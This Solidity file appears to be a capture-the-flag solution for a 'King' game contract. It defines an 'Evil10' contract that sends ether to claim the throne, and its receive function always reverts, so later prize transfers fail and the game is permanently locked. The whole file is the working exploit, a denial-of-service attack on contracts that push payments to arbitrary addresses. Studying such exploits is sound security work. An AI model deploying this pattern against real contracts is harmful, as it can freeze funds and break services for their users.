// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Evil10 {
    King king;

    constructor(address payable _king) public {
        king = King(_king);
    }

    function becomeKing() external payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    receive() external payable {
      revert("Ima only king");
  }
}